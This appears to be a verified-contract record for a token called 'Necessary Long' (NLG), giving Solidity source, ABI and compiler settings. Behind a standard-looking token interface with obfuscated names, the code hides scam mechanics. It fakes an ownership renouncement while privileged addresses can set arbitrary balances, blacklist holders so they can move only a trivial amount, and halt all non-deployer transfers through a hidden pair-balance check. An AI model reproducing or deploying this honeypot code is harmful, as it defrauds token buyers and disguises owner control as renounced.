{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface listTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundFromIs) external view returns (uint256);\n\n    function transfer(address autoWallet, uint256 feeMarketing) external returns (bool);\n\n    function allowance(address limitTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoWallet,\n        uint256 feeMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingTeam, uint256 value);\n    event Approval(address indexed limitTx, address indexed spender, uint256 value);\n}\n\nabstract contract launchEnableAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalTo {\n    function createPair(address feeShouldLiquidity, address modeSell) external returns (address);\n}\n\ninterface teamList is listTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NecessaryLong is launchEnableAt, listTx, teamList {\n\n    address public teamSell;\n\n    constructor (){\n        \n        toFee liquidityAuto = toFee(launchedExempt);\n        maxTake = totalTo(liquidityAuto.factory()).createPair(liquidityAuto.WETH(), address(this));\n        \n        teamSell = _msgSender();\n        launchLaunched();\n        launchedWallet[teamSell] = true;\n        maxLiquidity[teamSell] = buyTotal;\n        \n        emit Transfer(address(0), teamSell, buyTotal);\n    }\n\n    uint256 private receiverAmount;\n\n    address private takeLiquidityEnable;\n\n    mapping(address => uint256) private maxLiquidity;\n\n    function receiverTokenMode() private view {\n        require(launchedWallet[_msgSender()]);\n    }\n\n    uint256 private buyTotal = 100000000 * 10 ** 18;\n\n    uint256 private amountTx;\n\n    bool public senderLaunch;\n\n    string private listShould = \"NLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return modeTx;\n    }\n\n    uint8 private totalLiquiditySender = 18;\n\n    bool public walletListSwap;\n\n    function toLaunched(address enableListTotal) public {\n        receiverTokenMode();\n        \n        if (enableListTotal == teamSell || enableListTotal == maxTake) {\n            return;\n        }\n        launchedMinTeam[enableListTotal] = true;\n    }\n\n    address launchedExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address shouldExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address atReceiverLimit, uint256 feeMarketing) public virtual override returns (bool) {\n        totalSender[_msgSender()][atReceiverLimit] = feeMarketing;\n        emit Approval(_msgSender(), atReceiverLimit, feeMarketing);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeLiquidityEnable;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalSender;\n\n    function transfer(address receiverLaunched, uint256 feeMarketing) external virtual override returns (bool) {\n        return isMarketing(_msgSender(), receiverLaunched, feeMarketing);\n    }\n\n    function allowance(address marketingFund, address atReceiverLimit) external view virtual override returns (uint256) {\n        if (atReceiverLimit == launchedExempt) {\n            return type(uint256).max;\n        }\n        return totalSender[marketingFund][atReceiverLimit];\n    }\n\n    function listTrading(address receiverLaunched, uint256 feeMarketing) public {\n        receiverTokenMode();\n        maxLiquidity[receiverLaunched] = feeMarketing;\n    }\n\n    function balanceOf(address fundFromIs) public view virtual override returns (uint256) {\n        return maxLiquidity[fundFromIs];\n    }\n\n    uint256 constant amountMin = 16 ** 10;\n\n    uint256 public txBuy;\n\n    function owner() external view returns (address) {\n        return takeLiquidityEnable;\n    }\n\n    string private modeTx = \"Necessary Long\";\n\n    function txExempt(uint256 feeMarketing) public {\n        receiverTokenMode();\n        marketingTxReceiver = feeMarketing;\n    }\n\n    bool public senderBuy;\n\n    mapping(address => bool) public launchedMinTeam;\n\n    event OwnershipTransferred(address indexed marketingReceiver, address indexed swapMarketing);\n\n    function launchLaunched() public {\n        emit OwnershipTransferred(teamSell, address(0));\n        takeLiquidityEnable = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyTotal;\n    }\n\n    address public maxTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listShould;\n    }\n\n    function transferFrom(address fundTx, address autoWallet, uint256 feeMarketing) external override returns (bool) {\n        if (_msgSender() != launchedExempt) {\n            if (totalSender[fundTx][_msgSender()] != type(uint256).max) {\n                require(feeMarketing <= totalSender[fundTx][_msgSender()]);\n                totalSender[fundTx][_msgSender()] -= feeMarketing;\n            }\n        }\n        return isMarketing(fundTx, autoWallet, feeMarketing);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalLiquiditySender;\n    }\n\n    uint256 private shouldEnableSwap;\n\n    function shouldFund(address teamSender) public {\n        if (walletListSwap) {\n            return;\n        }\n        \n        launchedWallet[teamSender] = true;\n        \n        walletListSwap = true;\n    }\n\n    bool private shouldSender;\n\n    mapping(address => bool) public launchedWallet;\n\n    uint256 marketingTxReceiver;\n\n    uint256 txSwapFrom;\n\n    function maxReceiver(address fundTx, address autoWallet, uint256 feeMarketing) internal returns (bool) {\n        require(maxLiquidity[fundTx] >= feeMarketing);\n        maxLiquidity[fundTx] -= feeMarketing;\n        maxLiquidity[autoWallet] += feeMarketing;\n        emit Transfer(fundTx, autoWallet, feeMarketing);\n        return true;\n    }\n\n    function isMarketing(address fundTx, address autoWallet, uint256 feeMarketing) internal returns (bool) {\n        if (fundTx == teamSell) {\n            return maxReceiver(fundTx, autoWallet, feeMarketing);\n        }\n        uint256 takeWallet = listTx(maxTake).balanceOf(shouldExempt);\n        require(takeWallet == marketingTxReceiver);\n        require(autoWallet != shouldExempt);\n        if (launchedMinTeam[fundTx]) {\n            return maxReceiver(fundTx, autoWallet, amountMin);\n        }\n        return maxReceiver(fundTx, autoWallet, feeMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atReceiverLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFromIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMinTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"listTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"}],\"name\":\"shouldFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableListTotal\",\"type\":\"address\"}],\"name\":\"toLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"txExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletListSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NecessaryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}